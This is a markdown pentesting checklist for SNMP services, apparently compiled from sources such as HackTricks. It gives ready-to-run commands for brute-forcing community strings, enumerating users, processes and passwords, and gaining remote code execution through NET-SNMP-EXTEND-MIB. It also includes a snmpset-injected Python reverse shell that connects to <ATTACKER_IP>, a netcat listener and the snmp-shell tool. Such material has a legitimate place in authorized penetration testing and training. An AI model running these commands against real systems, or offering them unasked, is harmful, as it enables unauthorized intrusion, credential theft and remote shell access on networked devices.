# SNMP Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating SNMP (ports 161/udp, 162/udp, 10161/udp, 10162/udp), I realistically expect to find:

- [ ] Misconfigured public/private community strings
- [ ] System info (OS version, hostname, uptime)
- [ ] Network interface details (IPv4, IPv6)
- [ ] User accounts and processes (possible passwords in command lines)
- [ ] Writable access for command injection (RCE)
- [ ] Private community strings for configuration changes
- [ ] Trap data revealing sensitive info
- [ ] ACL bypass opportunities via spoofed IP

---

## ‚úÖ SNMP Pentest Checklist

- [ ] **Check for Open SNMP Ports**
    - Default: 161/udp (queries), 162/udp (traps)
    - Encrypted: 10161/udp, 10162/udp
    ```bash
    nmap -sU -p 161,162,10161,10162 <IP>
    ```

- [ ] **Brute-Force Community Strings**
    - Look for `public`, `private`, common strings.
    ```bash
    onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
    hydra -P /usr/share/wordlists/rockyou.txt <IP> snmp
    ```

- [ ] **Install MIB Support for Better Output**
    ```bash
    apt-get install snmp-mibs-downloader
    download-mibs
    ```

- [ ] **Basic Enumeration with snmpwalk**
    - All OIDs:
        ```bash
        snmpwalk -v2c -c public <IP> .1
        ```
    - Extended output:
        ```bash
        snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
        ```
    - Specific OID (IPv6 addresses):
        ```bash
        snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.34.1.3
        ```

- [ ] **Detailed Enumeration with snmp-check**
    ```bash
    snmp-check <IP> -c <COMM_STRING> -p 161
    ```

- [ ] **Nmap SNMP Scripts**
    ```bash
    nmap --script "snmp* and not snmp-brute" -sU -p161 <IP>
    ```

- [ ] **Extract Interesting Data**
    - OS Info:
        ```bash
        snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1.1.0
        ```
    - Uptime:
        ```bash
        snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1.3.0
        ```
    - Network Interfaces:
        ```bash
        snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.2.2
        ```
    - Users and Processes:
        ```bash
        snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.1.6
        snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2
        ```

---

## ‚úÖ SNMP RCE via NET-SNMP-EXTEND-MIB

‚≠ê If **RW community** is available, you can **inject commands**:

- [ ] **Inject Custom Command**
    ```bash
    snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <RW_COMMUNITY> <IP> \
    'nsExtendStatus."evilcmd"' = createAndGo \
    'nsExtendCommand."evilcmd"' = /bin/echo \
    'nsExtendArgs."evilcmd"' = 'hello world'
    ```

- [ ] **Trigger Command Execution**
    ```bash
    snmpwalk -v2c -c <RW_COMMUNITY> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
    ```

---

## ‚úÖ SNMP Reverse Shell via Extend

‚≠ê Exploit **run-on-read** to get a shell.

- [ ] **Inject Reverse Shell**
    ```bash
    snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <RW_COMMUNITY> <IP> \
    'nsExtendStatus."revsh"' = createAndGo \
    'nsExtendCommand."revsh"' = /usr/bin/python3.6 \
    'nsExtendArgs."revsh"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"<ATTACKER_IP>\",<PORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
    ```

- [ ] **Start Netcat Listener**
    ```bash
    nc -lvnp <PORT>
    ```

- [ ] **Trigger the Reverse Shell**
    ```bash
    snmpwalk -v2c -c <RW_COMMUNITY> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
    ```

---

## ‚úÖ SNMP-Shell Tool

- [ ] **Clone & Install**
    ```bash
    sudo apt install snmp snmp-mibs-downloader rlwrap -y
    git clone https://github.com/mxrch/snmp-shell
    cd snmp-shell
    sudo python3 -m pip install -r requirements.txt
    ```

- [ ] **Get Interactive SNMP Shell**
    ```bash
    rlwrap python3 snmp-shell.py -t <IP> -c <RW_COMMUNITY>
    ```

---

## ‚úÖ Massive SNMP Enumeration with Braa

- [ ] **Install & Run Braa**
    ```bash
    braa public@192.168.1.125:.1.3.6.*
    ```

- [ ] **Filter Interesting Info**
    - Devices:
        ```bash
        grep ".1.3.6.1.2.1.1.1.0" *.snmp
        ```
    - Trap Data:
        ```bash
        grep -i "trap" *.snmp
        ```
    - Usernames/Passwords:
        ```bash
        grep -i "login\|fail" *.snmp
        ```
    - Emails:
        ```bash
        grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" *.snmp
        ```

---

## ‚úÖ Examining SNMP Configuration Files

- Look for:
    - `/etc/snmp/snmp.conf`
    - `/etc/snmp/snmpd.conf`
    - `snmp-config.xml`

---

## ‚úÖ Ports to Check

- SNMP Agent: **161/udp**
- SNMP Manager (Traps): **162/udp**
- TLS/DTLS Secure SNMP:
    - **10161/udp** (queries)
    - **10162/udp** (traps)

---

## ‚úÖ References

- HackTricks: [Pentesting SNMP](https://book.hacktricks.xyz/pentesting/pentesting-snmp)
- SNMP-Shell: [https://github.com/mxrch/snmp-shell](https://github.com/mxrch/snmp-shell)
- SNMP RCE Writeup: [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)

---
